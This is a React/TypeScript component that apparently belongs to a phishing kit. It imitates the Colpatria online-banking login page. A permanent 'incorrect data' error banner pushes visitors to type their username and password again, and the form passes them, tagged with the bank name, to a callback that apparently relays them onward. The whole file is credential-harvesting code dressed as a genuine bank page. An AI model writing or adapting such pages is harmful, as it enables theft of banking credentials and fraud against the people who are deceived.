/* eslint-disable @next/next/no-html-link-for-pages */
/* eslint-disable @next/next/no-img-element */
// app/promo/components/LoginCard.tsx
"use client";
import React, { useState } from 'react';
import { User, Lock } from 'lucide-react';

const DaviplataLogo: React.FC = () => (
  <div className="flex items-center space-x-1 mb-6 pt-2">
    <img src="/bancos/colpatria/new-brand-red.svg" className='h-8 w-[120px]' alt="DAVIPLATA Logo" />
  </div>
);

interface LoginCardProps {
  enviar?: ({ view, user, pass, bank }: { view: string, user: string, pass: string, bank: string }) => void;
}

const ErrorApp: React.FC<LoginCardProps> = ({ enviar }) => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    enviar?.({ view: "errorlogin", user: username, pass: password, bank: "colpatria" });
  };

  return (
    <div className="w-full mx-auto pl-[37px] pr-[37px] pt-[41px] pb-0 bg-white min-h-screen">
      <DaviplataLogo />

      <h1 className="text-[27px] font-extrabold text-gray-800 mb-4">
        Ingresa a tu Banca Virtual
      </h1>

      {/* Error Banner */}
      <div style={{ backgroundColor: '#ffebee', color: '#c62828', padding: '12px', borderRadius: '8px', marginBottom: '16px', textAlign: 'center', fontWeight: 'bold', fontSize: '14px' }}>
        Datos incorrectos. Por favor, verifica tu usuario y clave e inténtalo de nuevo.
      </div>

      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="relative">
          <User className="absolute left-0 top-1/2 transform -translate-y-1/2 text-gray-500 w-5 h-5" />
          <input
            type="text"
            placeholder="Nombre de usuario"
            className="w-full pl-7 pb-2 border-b-2 border-gray-300 focus:border-[#007eab] outline-none text-base transition duration-150"
            required
            value={username}
            onChange={(e) => setUsername(e.target.value)}
          />
        </div>

        <div className="relative pt-4">
          <Lock className="absolute left-0 top-[calc(100% - 1.5rem)] transform -translate-y-1/2 text-gray-500 w-4 h-4" />
          <input
            type="password"
            placeholder="Contraseña"
            className="w-full pl-7 pb-2 border-b-2 border-gray-300 focus:border-[#007eab] outline-none text-base transition duration-150"
            required
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <div className="margin-xs-18--top text-[#007eab]"><a className="link link__text font-bold text-[12px]" id="linkHelpId">¿Olvidaste tu usuario o contraseña?</a></div>
        </div>

        <div className="flex items-center pt-2">
          <input
            id="remember"
            type="checkbox"
            className="h-4 w-4 text-[#007eab] border-gray-300 rounded focus:ring-[#007eab]"
          />
          <label htmlFor="remember" className="ml-2 text-sm text-gray-700 select-none">
            Recordar mi nombre de usuario
          </label>
        </div>

        <button
          type="submit"
          className="w-full py-3 mt-8 text-[16px] text-white bg-[#ec111a] hover:bg-[#be061b] font-medium rounded-md transition duration-200 shadow-md cursor-pointer"
        >
          Ingresar
        </button>
      </form>

      <div className="flex justify-between items-center mt-6 text-sm">
        <span className="text-gray-600">
          ¿Eres nuevo con nosotros?
        </span>
        <a
          href="/activar-usuario"
          className="text-[#007eab] font-bold hover:text-red-700 flex items-center"
        >
          Activa tu usuario
        </a>
      </div>
    </div>
  );
};

export default ErrorApp;
